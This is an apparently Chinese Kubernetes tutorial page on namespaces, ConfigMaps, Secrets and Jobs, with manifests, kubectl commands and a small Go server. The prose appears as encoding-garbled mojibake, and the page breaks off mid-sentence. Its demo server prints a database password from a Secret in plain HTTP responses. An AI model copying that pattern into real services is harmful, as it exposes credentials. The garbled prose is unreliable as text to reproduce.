ä¸­ï¼Œ<strong>åå­—ç©ºé—´ï¼ˆNamespaceï¼‰</strong> æä¾›ä¸€ç§æœºåˆ¶ï¼Œå°†åŒä¸€é›†ç¾¤ä¸­çš„èµ„æºåˆ’åˆ†ä¸ºç›¸äº’éš”ç¦»çš„ç»„ã€‚ åŒä¸€åå­—ç©ºé—´å†…çš„èµ„æºåç§°è¦å”¯ä¸€ï¼Œä½†è·¨åå­—ç©ºé—´æ—¶æ²¡æœ‰è¿™ä¸ªè¦æ±‚ã€‚ åå­—ç©ºé—´ä½œç”¨åŸŸä»…é’ˆå¯¹å¸¦æœ‰åå­—ç©ºé—´çš„å¯¹è±¡ï¼Œä¾‹å¦‚ Deploymentã€Service ç­‰ã€‚</p><p>å‰é¢çš„æ•™ç¨‹ä¸­ï¼Œé»˜è®¤ä½¿ç”¨çš„ namespace æ˜¯ <code>default</code>ã€‚</p><p>ä¸‹é¢å±•ç¤ºå¦‚ä½•åˆ›å»ºä¸€ä¸ªæ–°çš„ namespaceï¼Œ <code>namespace.yaml</code> æ–‡ä»¶å®šä¹‰äº†ä¸¤ä¸ªä¸åŒçš„ namespaceï¼Œåˆ†åˆ«æ˜¯ <code>dev</code> å’Œ <code>test</code>ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Namespace</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">dev</span><br>  <br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Namespace</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">test</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡<code>kubectl apply -f namespaces.yaml</code> åˆ›å»ºä¸¤ä¸ªæ–°çš„ namespaceï¼Œåˆ†åˆ«æ˜¯ <code>dev</code> å’Œ <code>test</code>ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">kubectl</span> <span class="hljs-string">apply</span> <span class="hljs-string">-f</span> <span class="hljs-string">namespaces.yaml</span>    <br><span class="hljs-comment"># namespace/dev created</span><br><span class="hljs-comment"># namespace/test created</span><br><br><br><span class="hljs-string">kubectl</span> <span class="hljs-string">get</span> <span class="hljs-string">namespaces</span>          <br><span class="hljs-comment"># NAME              STATUS   AGE</span><br><span class="hljs-comment"># default           Active   215d</span><br><span class="hljs-comment"># dev               Active   2m44s</span><br><span class="hljs-comment"># ingress-nginx     Active   110d</span><br><span class="hljs-comment"># kube-node-lease   Active   215d</span><br><span class="hljs-comment"># kube-public       Active   215d</span><br><span class="hljs-comment"># kube-system       Active   215d</span><br><span class="hljs-comment"># test              Active   2m44s</span><br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚ä½•åœ¨æ–°çš„ namespace ä¸‹åˆ›å»ºèµ„æºå’Œè·å–èµ„æºå‘¢ï¼Ÿåªéœ€è¦åœ¨å‘½ä»¤åé¢åŠ ä¸Š <code>-n namespace</code> å³å¯ã€‚ä¾‹å¦‚æ ¹æ®ä¸Šé¢æ•™ç¨‹ä¸­ï¼Œåœ¨åä¸º <code>dev</code> çš„ namespace ä¸‹åˆ›å»º <code>hellok8s:v3</code> çš„ deployment èµ„æºã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl apply -f deployment.yaml -n dev<br><br>kubectl get pods -n dev<br></code></pre></td></tr></table></figure><h1 id="ConfigMap"><a href="#ConfigMap" class="headerlink" title="ConfigMap"></a>ConfigMap</h1><p>ä¸Šé¢çš„æ•™ç¨‹æåˆ°ï¼Œæˆ‘ä»¬åœ¨ä¸åŒç¯å¢ƒ <code>dev</code> <code>test</code> <code>uat</code> <code>prod</code> ä¸­åŒºåˆ†èµ„æºï¼Œå¯ä»¥è®©å…¶èµ„æºç‹¬ç«‹äº’ç›¸ä¸å—å½±å“ï¼Œä½†æ˜¯éšä¹‹è€Œæ¥ä¹Ÿä¼šå¸¦æ¥ä¸€äº›é—®é¢˜ï¼Œä¾‹å¦‚ä¸åŒç¯å¢ƒçš„æ•°æ®åº“çš„åœ°å€å¾€å¾€æ˜¯ä¸ä¸€æ ·çš„ï¼Œé‚£ä¹ˆå¦‚æœåœ¨ä»£ç ä¸­å†™åŒä¸€ä¸ªæ•°æ®åº“çš„åœ°å€ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ã€‚</p><p>K8S ä½¿ç”¨ ConfigMap æ¥å°†ä½ çš„é…ç½®æ•°æ®å’Œåº”ç”¨ç¨‹åºä»£ç åˆ†å¼€ï¼Œå°†éæœºå¯†æ€§çš„æ•°æ®ä¿å­˜åˆ°é”®å€¼å¯¹ä¸­ã€‚ConfigMap åœ¨è®¾è®¡ä¸Šä¸æ˜¯ç”¨æ¥ä¿å­˜å¤§é‡æ•°æ®çš„ã€‚åœ¨ ConfigMap ä¸­ä¿å­˜çš„æ•°æ®ä¸å¯è¶…è¿‡ 1 MiBã€‚å¦‚æœä½ éœ€è¦ä¿å­˜è¶…å‡ºæ­¤å°ºå¯¸é™åˆ¶çš„æ•°æ®ï¼Œä½ å¯èƒ½è€ƒè™‘æŒ‚è½½å­˜å‚¨å·ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬å¯ä»¥æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬ä¿®æ”¹ä¹‹å‰ä»£ç ï¼Œå‡è®¾ä¸åŒç¯å¢ƒçš„æ•°æ®åº“åœ°å€ä¸åŒï¼Œä¸‹é¢ä»£ç ä»ç¯å¢ƒå˜é‡ä¸­è·å– <code>DB_URL</code>ï¼Œå¹¶å°†å®ƒè¿”å›ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hello</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>host, _ := os.Hostname()<br>dbURL := os.Getenv(<span class="hljs-string">&quot;DB_URL&quot;</span>)<br>io.WriteString(w, fmt.Sprintf(<span class="hljs-string">&quot;[v4] Hello, Kubernetes! From host: %s, Get Database Connect URL: %s&quot;</span>, host, dbURL))<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, hello)<br>http.ListenAndServe(<span class="hljs-string">&quot;:3000&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>æ„å»º <code>hellok8s:v4</code> çš„é•œåƒï¼Œæ¨é€åˆ°è¿œç¨‹ä»“åº“ã€‚å¹¶åˆ é™¤ä¹‹å‰åˆ›å»ºçš„æ‰€æœ‰èµ„æºã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker build . -t guangzhengli/hellok8s:v4<br>docker push guangzhengli/hellok8s:v4<br><br>kubectl delete deployment,service,ingress --all<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆ›å»ºä¸åŒ namespace çš„ configmap æ¥å­˜æ”¾ <code>DB_URL</code>ã€‚</p><p>åˆ›å»º <code>hellok8s-config-dev.yaml</code> æ–‡ä»¶</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ConfigMap</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-config</span><br><span class="hljs-attr">data:</span><br>  <span class="hljs-attr">DB_URL:</span> <span class="hljs-string">&quot;http://DB_ADDRESS_DEV&quot;</span><br></code></pre></td></tr></table></figure><p>åˆ›å»º <code>hellok8s-config-test.yaml</code> æ–‡ä»¶</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ConfigMap</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-config</span><br><span class="hljs-attr">data:</span><br>  <span class="hljs-attr">DB_URL:</span> <span class="hljs-string">&quot;http://DB_ADDRESS_TEST&quot;</span><br></code></pre></td></tr></table></figure><p>åˆ†åˆ«åœ¨ <code>dev</code> <code>test</code> ä¸¤ä¸ª namespace ä¸‹åˆ›å»ºç›¸åŒçš„ <code>ConfigMap</code>ï¼Œåå­—éƒ½å« hellok8s-configï¼Œä½†æ˜¯å­˜æ”¾çš„ Pair å¯¹ä¸­ Value å€¼ä¸ä¸€æ ·ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl apply -f hellok8s-config-dev.yaml -n dev<br><span class="hljs-meta prompt_"># </span><span class="language-bash">configmap/hellok8s-config created</span><br><br>kubectl apply -f hellok8s-config-test.yaml -n test <br><span class="hljs-meta prompt_"># </span><span class="language-bash">configmap/hellok8s-config created</span><br><br>kubectl get configmap --all-namespaces<br>NAMESPACE         NAME                                 DATA   AGE<br>dev               hellok8s-config                      1      3m12s<br>test              hellok8s-config                      1      2m1s<br></code></pre></td></tr></table></figure><p>æ¥ç€ä½¿ç”¨ POD çš„æ–¹å¼æ¥éƒ¨ç½² <code>hellok8s:v4</code>ï¼Œå…¶ä¸­ <code>env.name</code> è¡¨ç¤ºçš„æ˜¯å°† configmap ä¸­çš„å€¼å†™è¿›ç¯å¢ƒå˜é‡ï¼Œè¿™æ ·ä»£ç ä»ç¯å¢ƒå˜é‡ä¸­è·å– <code>DB_URL</code>ï¼Œè¿™ä¸ª KEY åç§°å¿…é¡»ä¿æŒä¸€è‡´ã€‚<code>valueFrom</code> ä»£è¡¨ä»å“ªé‡Œè¯»å–ï¼Œ<code>configMapKeyRef</code> è¿™é‡Œè¡¨ç¤ºä»åä¸º <code>hellok8s-config</code> çš„ <code>configMap</code> ä¸­è¯»å– <code>KEY=DB_URL</code> çš„ Valueã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-pod</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-container</span><br>      <span class="hljs-attr">image:</span> <span class="hljs-string">guangzhengli/hellok8s:v4</span><br>      <span class="hljs-attr">env:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">DB_URL</span><br>          <span class="hljs-attr">valueFrom:</span><br>            <span class="hljs-attr">configMapKeyRef:</span><br>              <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-config</span><br>              <span class="hljs-attr">key:</span> <span class="hljs-string">DB_URL</span><br></code></pre></td></tr></table></figure><p>ä¸‹é¢åˆ†åˆ«åœ¨ <code>dev</code> <code>test</code> ä¸¤ä¸ª namespace ä¸‹åˆ›å»º <code>hellok8s:v4</code>ï¼Œæ¥ç€é€šè¿‡ <code>port-forward</code> çš„æ–¹å¼è®¿é—®ä¸åŒ namespace çš„æœåŠ¡ï¼Œå¯ä»¥çœ‹åˆ°è¿”å›çš„ <code>Get Database Connect URL: http://DB_ADDRESS_TEST</code> æ˜¯ä¸ä¸€æ ·çš„ï¼</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl apply -f hellok8s.yaml -n dev             <br><span class="hljs-meta prompt_"># </span><span class="language-bash">pod/hellok8s-pod created</span><br><br>kubectl apply -f hellok8s.yaml -n test<br><span class="hljs-meta prompt_"># </span><span class="language-bash">pod/hellok8s-pod created</span><br><br>kubectl port-forward hellok8s-pod 3000:3000 -n dev<br><br>curl http://localhost:3000<br><span class="hljs-meta prompt_"># </span><span class="language-bash">[v4] Hello, Kubernetes! From host: hellok8s-pod, Get Database Connect URL: http://DB_ADDRESS_DEV</span><br><br>kubectl port-forward hellok8s-pod 3000:3000 -n test<br><br>curl http://localhost:3000<br><span class="hljs-meta prompt_"># </span><span class="language-bash">[v4] Hello, Kubernetes! From host: hellok8s-pod, Get Database Connect URL: http://DB_ADDRESS_TEST</span><br></code></pre></td></tr></table></figure><h1 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h1><p>ä¸Šé¢æåˆ°ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©ä»¥ configmap çš„æ–¹å¼æŒ‚è½½é…ç½®ä¿¡æ¯ï¼Œä½†æ˜¯å½“æˆ‘ä»¬çš„é…ç½®ä¿¡æ¯éœ€è¦åŠ å¯†çš„æ—¶å€™ï¼Œ configmap å°±æ— æ³•æ»¡è¶³è¿™ä¸ªè¦æ±‚ã€‚ä¾‹å¦‚ä¸Šé¢è¦æŒ‚è½½æ•°æ®åº“å¯†ç çš„æ—¶å€™ï¼Œå°±éœ€è¦æ˜æ–‡æŒ‚è½½ã€‚</p><p>è¿™ä¸ªæ—¶å€™å°±éœ€è¦ Secret æ¥å­˜å‚¨åŠ å¯†ä¿¡æ¯ï¼Œè™½ç„¶åœ¨èµ„æºæ–‡ä»¶çš„ç¼–ç ä¸Šï¼Œåªæ˜¯é€šè¿‡ Base64 çš„æ–¹å¼ç®€å•ç¼–ç ï¼Œä½†æ˜¯åœ¨å®é™…ç”Ÿäº§è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥é€šè¿‡ pipeline æˆ–è€…ä¸“ä¸šçš„ <a href="https://aws.amazon.com/kms/">AWS KMS</a> æœåŠ¡è¿›è¡Œå¯†é’¥ç®¡ç†ã€‚è¿™æ ·å°±å¤§å¤§å‡å°‘äº†å®‰å…¨äº‹æ•…ã€‚</p><blockquote><p>Secret æ˜¯ä¸€ç§åŒ…å«å°‘é‡æ•æ„Ÿä¿¡æ¯ä¾‹å¦‚å¯†ç ã€ä»¤ç‰Œæˆ–å¯†é’¥çš„å¯¹è±¡ã€‚ç”±äºåˆ›å»º Secret å¯ä»¥ç‹¬ç«‹äºä½¿ç”¨å®ƒä»¬çš„ Podï¼Œ å› æ­¤åœ¨åˆ›å»ºã€æŸ¥çœ‹å’Œç¼–è¾‘ Pod çš„å·¥ä½œæµç¨‹ä¸­æš´éœ² Secretï¼ˆåŠå…¶æ•°æ®ï¼‰çš„é£é™©è¾ƒå°ã€‚ Kubernetes å’Œåœ¨é›†ç¾¤ä¸­è¿è¡Œçš„åº”ç”¨ç¨‹åºä¹Ÿå¯ä»¥å¯¹ Secret é‡‡å–é¢å¤–çš„é¢„é˜²æªæ–½ï¼Œ ä¾‹å¦‚é¿å…å°†æœºå¯†æ•°æ®å†™å…¥éæ˜“å¤±æ€§å­˜å‚¨ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒKubernetes Secret æœªåŠ å¯†åœ°å­˜å‚¨åœ¨ API æœåŠ¡å™¨çš„åº•å±‚æ•°æ®å­˜å‚¨ï¼ˆetcdï¼‰ä¸­ã€‚ ä»»ä½•æ‹¥æœ‰ API è®¿é—®æƒé™çš„äººéƒ½å¯ä»¥æ£€ç´¢æˆ–ä¿®æ”¹ Secretï¼Œä»»ä½•æœ‰æƒè®¿é—® etcd çš„äººä¹Ÿå¯ä»¥ã€‚ æ­¤å¤–ï¼Œä»»ä½•æœ‰æƒé™åœ¨å‘½åç©ºé—´ä¸­åˆ›å»º Pod çš„äººéƒ½å¯ä»¥ä½¿ç”¨è¯¥è®¿é—®æƒé™è¯»å–è¯¥å‘½åç©ºé—´ä¸­çš„ä»»ä½• Secretï¼› è¿™åŒ…æ‹¬é—´æ¥è®¿é—®ï¼Œä¾‹å¦‚åˆ›å»º Deployment çš„èƒ½åŠ›ã€‚</p><p>ä¸ºäº†å®‰å…¨åœ°ä½¿ç”¨ Secretï¼Œè¯·è‡³å°‘æ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š</p><ol><li>ä¸º Secret <a href="https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/">å¯ç”¨é™æ€åŠ å¯†</a>ï¼›</li><li><a href="https://kubernetes.io/docs/reference/access-authn-authz/authorization/">å¯ç”¨æˆ–é…ç½® RBAC è§„åˆ™</a>æ¥é™åˆ¶è¯»å–å’Œå†™å…¥ Secret çš„æ•°æ®ï¼ˆåŒ…æ‹¬é€šè¿‡é—´æ¥æ–¹å¼ï¼‰ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¢«å‡†è®¸åˆ›å»º Pod çš„äººä¹Ÿéšå¼åœ°è¢«æˆæƒè·å– Secret å†…å®¹ã€‚</li><li>åœ¨é€‚å½“çš„æƒ…å†µä¸‹ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ RBAC ç­‰æœºåˆ¶æ¥é™åˆ¶å…è®¸å“ªäº›ä¸»ä½“åˆ›å»ºæ–° Secret æˆ–æ›¿æ¢ç°æœ‰ Secretã€‚</li></ol></blockquote><p>Secret çš„èµ„æºå®šä¹‰å’Œ ConfigMap ç»“æ„åŸºæœ¬ä¸€è‡´ï¼Œå”¯ä¸€åŒºåˆ«åœ¨äº kind æ˜¯ <code>Secret</code>ï¼Œè¿˜æœ‰ Value éœ€è¦ Base64 ç¼–ç ï¼Œä½ å¯ä»¥é€šè¿‡ä¸‹é¢å‘½ä»¤å¿«é€Ÿ Base64 ç¼–è§£ç ã€‚å½“ç„¶ Secret ä¹Ÿæä¾›äº†ä¸€ç§ <code>stringData</code>ï¼Œå¯ä»¥ä¸éœ€è¦ Base64 ç¼–ç ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;db_password&quot; | base64<br><span class="hljs-meta prompt_"># </span><span class="language-bash">ZGJfcGFzc3dvcmQK</span><br><br>echo &quot;ZGJfcGFzc3dvcmQK&quot; | base64 -d<br><span class="hljs-meta prompt_"># </span><span class="language-bash">db_password</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°† Base64 ç¼–ç è¿‡åçš„å€¼ï¼Œå¡«å…¥å¯¹åº”çš„ key - value ä¸­ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># hellok8s-secret.yaml</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Secret</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-secret</span><br><span class="hljs-attr">data:</span><br>  <span class="hljs-attr">DB_PASSWORD:</span> <span class="hljs-string">&quot;ZGJfcGFzc3dvcmQK&quot;</span><br><span class="hljs-comment"># hellok8s.yaml</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-pod</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-container</span><br>      <span class="hljs-attr">image:</span> <span class="hljs-string">guangzhengli/hellok8s:v5</span><br>      <span class="hljs-attr">env:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">DB_PASSWORD</span><br>          <span class="hljs-attr">valueFrom:</span><br>            <span class="hljs-attr">secretKeyRef:</span><br>              <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-secret</span><br>              <span class="hljs-attr">key:</span> <span class="hljs-string">DB_PASSWORD</span><br><span class="hljs-string">package</span> <span class="hljs-string">main</span><br><br><span class="hljs-string">import</span> <span class="hljs-string">(</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">)</span><br><br><span class="hljs-string">func</span> <span class="hljs-string">hello(w</span> <span class="hljs-string">http.ResponseWriter,</span> <span class="hljs-string">r</span> <span class="hljs-string">*http.Request)</span> &#123;<br><span class="hljs-string">host</span>, <span class="hljs-string">_</span> <span class="hljs-string">:=</span> <span class="hljs-string">os.Hostname()</span><br><span class="hljs-string">dbPassword</span> <span class="hljs-string">:=</span> <span class="hljs-string">os.Getenv(&quot;DB_PASSWORD&quot;)</span><br><span class="hljs-string">io.WriteString(w</span>, <span class="hljs-string">fmt.Sprintf(&quot;</span>[<span class="hljs-string">v5</span>] <span class="hljs-string">Hello</span>, <span class="hljs-string">Kubernetes!</span> <span class="hljs-attr">From host:</span> <span class="hljs-string">%s</span>, <span class="hljs-attr">Get Database Connect Password:</span> <span class="hljs-string">%s&quot;</span>, <span class="hljs-string">host</span>, <span class="hljs-string">dbPassword))</span><br>&#125;<br><br><span class="hljs-string">func</span> <span class="hljs-string">main()</span> &#123;<br><span class="hljs-string">http.HandleFunc(&quot;/&quot;</span>, <span class="hljs-string">hello)</span><br><span class="hljs-string">http.ListenAndServe(&quot;:3000&quot;</span>, <span class="hljs-string">nil)</span><br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ä»£ç ä¸­è¯»å– <code>DB_PASSWORD</code> ç¯å¢ƒå˜é‡ï¼Œç›´æ¥è¿”å›å¯¹åº”å­—ç¬¦ä¸²ã€‚Secret çš„ä½¿ç”¨æ–¹æ³•å’Œå‰é¢æ•™ç¨‹ä¸­ ConfigMap åŸºæœ¬ä¸€è‡´ï¼Œè¿™é‡Œå°±ä¸å†è¿‡å¤šèµ˜è¿°ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker build . -t guangzhengli/hellok8s:v5<br><br>docker push guangzhengli/hellok8s:v5<br><br>kubectl apply -f hellok8s-secret.yaml<br><br>kubectl apply -f hellok8s.yaml<br><br>kubectl port-forward hellok8s-pod 3000:3000<br></code></pre></td></tr></table></figure><h1 id="Job"><a href="#Job" class="headerlink" title="Job"></a>Job</h1><p>åœ¨å®é™…çš„å¼€å‘è¿‡ç¨‹ä¸­ï¼Œè¿˜æœ‰ä¸€ç±»ä»»åŠ¡æ˜¯ä¹‹å‰çš„èµ„æºä¸èƒ½æ»¡è¶³çš„ï¼Œå³ä¸€æ¬¡æ€§ä»»åŠ¡ã€‚ä¾‹å¦‚å¸¸è§çš„è®¡ç®—ä»»åŠ¡ï¼Œåªéœ€è¦æ‹¿åˆ°ç›¸å…³æ•°æ®è®¡ç®—åå¾—å‡ºç»“æœå³å¯ï¼Œæ— éœ€ä¸€ç›´è¿è¡Œã€‚è€Œå¤„ç†è¿™ä¸€ç±»ä»»åŠ¡çš„èµ„æºå°±æ˜¯ Jobã€‚</p><blockquote><p>Job ä¼šåˆ›å»ºä¸€ä¸ªæˆ–è€…å¤šä¸ª Podï¼Œå¹¶å°†ç»§ç»­é‡è¯• Pod çš„æ‰§è¡Œï¼Œç›´åˆ°æŒ‡å®šæ•°é‡çš„ Pod æˆåŠŸç»ˆæ­¢ã€‚ éšç€ Pod æˆåŠŸç»“æŸï¼ŒJob è·Ÿè¸ªè®°å½•æˆåŠŸå®Œæˆçš„ Pod ä¸ªæ•°ã€‚ å½“æ•°é‡è¾¾åˆ°æŒ‡å®šçš„æˆåŠŸä¸ªæ•°é˜ˆå€¼æ—¶ï¼Œä»»åŠ¡ï¼ˆå³ Jobï¼‰ç»“æŸã€‚ åˆ é™¤ Job çš„æ“ä½œä¼šæ¸…é™¤æ‰€åˆ›å»ºçš„å…¨éƒ¨ Podã€‚ æŒ‚èµ· Job çš„æ“ä½œä¼šåˆ é™¤ Job çš„æ‰€æœ‰æ´»è·ƒ Podï¼Œç›´åˆ° Job è¢«å†æ¬¡æ¢å¤æ‰§è¡Œã€‚</p><p>ä¸€ç§ç®€å•çš„ä½¿ç”¨åœºæ™¯ä¸‹ï¼Œä½ ä¼šåˆ›å»ºä¸€ä¸ª Job å¯¹è±¡ä»¥ä¾¿ä»¥ä¸€ç§å¯é çš„æ–¹å¼è¿è¡ŒæŸ Pod ç›´åˆ°å®Œæˆã€‚ å½“ç¬¬ä¸€ä¸ª Pod å¤±è´¥æˆ–è€…è¢«åˆ é™¤ï¼ˆæ¯”å¦‚å› ä¸ºèŠ‚ç‚¹ç¡¬ä»¶å¤±æ•ˆæˆ–è€…é‡å¯ï¼‰æ—¶ï¼ŒJob å¯¹è±¡ä¼šå¯åŠ¨ä¸€ä¸ªæ–°çš„ Podã€‚</p></blockquote><p>ä¸‹é¢æ¥çœ‹ä¸€ä¸ª Job çš„èµ„æºå®šä¹‰ï¼Œå…¶ä¸­ Kind å’Œ metadata.name æ˜¯èµ„æºç±»å‹å’Œåå­—å°±ä¸å†è§£é‡Šï¼Œ<code>completions</code> æŒ‡çš„æ˜¯ä¼šåˆ›å»º Pod çš„æ•°é‡ï¼Œæ¯ä¸ª pod éƒ½ä¼šå®Œæˆä¸‹é¢çš„ä»»åŠ¡ã€‚<code>parallelism</code> 